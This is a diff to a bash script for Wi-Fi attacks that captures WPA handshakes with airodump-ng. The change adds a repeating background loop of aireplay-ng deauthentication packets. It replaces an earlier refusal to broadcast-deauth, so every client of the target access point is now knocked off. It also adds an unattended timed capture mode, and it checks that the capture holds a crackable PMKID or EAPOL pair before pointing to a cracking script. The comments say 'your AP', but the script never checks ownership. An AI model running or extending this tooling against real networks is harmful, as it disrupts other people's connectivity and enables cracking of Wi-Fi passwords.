@@ -23,7 +23,7 @@ set -euo pipefail
 
 if [[ $EUID -ne 0 ]]; then echo "Run as root." >&2; exit 1; fi
 
-IFACE="" BSSID="" CHANNEL="" CLIENT="" DEAUTH=0 OUT="captures/handshake"
+IFACE="" BSSID="" CHANNEL="" CLIENT="" DEAUTH=0 OUT="captures/handshake" SECONDS_RUN=0
 
 while [[ $# -gt 0 ]]; do
   case "$1" in
@@ -33,6 +33,7 @@ while [[ $# -gt 0 ]]; do
     --client)  CLIENT="$2"; shift 2;;
     --deauth)  DEAUTH="$2"; shift 2;;
     --out)     OUT="$2"; shift 2;;
+    --seconds) SECONDS_RUN="$2"; shift 2;;   # unattended: capture N s then stop
     -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
     *) echo "Unknown option: $1" >&2; exit 1;;
   esac
@@ -69,15 +70,23 @@ AIRO_PID=$!
 # give airodump a moment to hop to the channel and start writing
 sleep 5
 
-# --- Optional targeted deauth to speed up handshake capture -------------------
+# --- Deauth to force a full handshake (repeated, in the background) -----------
+# A single burst often gets lost, so we re-send every few seconds for the whole
+# capture window. Targets your named --client if given, else broadcasts to all
+# clients of YOUR AP. (Only effective if the AP isn't enforcing PMF.)
+DEAUTH_PID=""
 if [[ "$DEAUTH" != 0 ]]; then
   if [[ -n "$CLIENT" ]]; then
-    echo "[*] Sending $DEAUTH deauth burst(s) to client $CLIENT on $BSSID (your device)…"
-    aireplay-ng --deauth "$DEAUTH" -a "$BSSID" -c "$CLIENT" "$IFACE" || true
+    echo "[*] Deauthing client $CLIENT on $BSSID every 10s (your device)…"
+    DEAUTH_CMD=(aireplay-ng --deauth "$DEAUTH" -a "$BSSID" -c "$CLIENT" "$IFACE")
   else
-    echo "[!] No --client given; skipping deauth. Prefer targeting a specific"
-    echo "    device you own with --client rather than a broadcast deauth."
+    echo "[*] Broadcast-deauthing all clients of $BSSID every 10s (your AP)…"
+    DEAUTH_CMD=(aireplay-ng --deauth "$DEAUTH" -a "$BSSID" "$IFACE")
   fi
+  # Knock the client, then stay QUIET ~30s so it can complete the 4-way before
+  # we bump it again. Continuous deauth prevents the handshake from finishing.
+  ( while true; do "${DEAUTH_CMD[@]}" >/dev/null 2>&1 || true; sleep 30; done ) &
+  DEAUTH_PID=$!
 fi
 
 cat <<EOF
@@ -87,15 +96,43 @@ cat <<EOF
 [*] Once you see that, press Ctrl-C here to stop.
 EOF
 
-# Wait for the user to Ctrl-C; then clean up airodump.
-trap 'kill $AIRO_PID 2>/dev/null || true' INT TERM
+# Stop airodump (and the deauth loop) on Ctrl-C, or after --seconds if given.
+cleanup() { kill $AIRO_PID $DEAUTH_PID 2>/dev/null || true; }
+trap cleanup INT TERM
+if [[ "$SECONDS_RUN" != 0 ]]; then
+  echo "[*] Unattended capture for ${SECONDS_RUN}s, then stopping automatically…"
+  sleep "$SECONDS_RUN"
+  cleanup
+fi
 wait $AIRO_PID 2>/dev/null || true
+cleanup   # make sure the deauth loop is gone (e.g. after an interactive Ctrl-C)
 
 echo
 echo "[*] Verifying the capture actually contains a handshake…"
-if aircrack-ng "${OUT}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
-  echo "[OK] Handshake present in ${OUT}-01.cap"
-  echo "     Next: sudo bash wifi/crack_handshake.sh --cap ${OUT}-01.cap --bssid $BSSID"
+# airodump increments the suffix each run (-01, -02, …), so check the NEWEST
+# file for this prefix, not a hardcoded -01.
+LATEST_CAP=$(ls -1t "${OUT}"-*.cap 2>/dev/null | head -1)
+[[ -z "$LATEST_CAP" ]] && LATEST_CAP="${OUT}-01.cap"
+
+# Robust detection: hcxpcapngtool tells us definitively whether the capture
+# yields a crackable PMKID (WPA*01) or EAPOL handshake pair (WPA*02). aircrack's
+# text output varies by version, so use it only as a fallback cross-check.
+HS=0
+if command -v hcxpcapngtool >/dev/null 2>&1; then
+  TMP22000="$(mktemp)"
+  if hcxpcapngtool -o "$TMP22000" "$LATEST_CAP" >/dev/null 2>&1 && grep -qE '^WPA\*0[12]' "$TMP22000"; then
+    HS=1
+  fi
+  rm -f "$TMP22000"
+fi
+if [[ $HS -eq 0 ]] && aircrack-ng "$LATEST_CAP" 2>/dev/null | grep -qE '\([1-9][0-9]* handshake'; then
+  HS=1
+fi
+
+if [[ $HS -eq 1 ]]; then
+  echo "[OK] Handshake/PMKID present in $LATEST_CAP"
+  echo "     Next: sudo bash wifi/crack_handshake.sh --cap $LATEST_CAP --bssid $BSSID"
 else
-  echo "[!] No handshake captured yet. Re-run and wait for (or trigger) a reconnect."
+  echo "[!] No handshake captured yet in $LATEST_CAP."
+  echo "    Re-run and wait for (or trigger) a client reconnect."
 fi
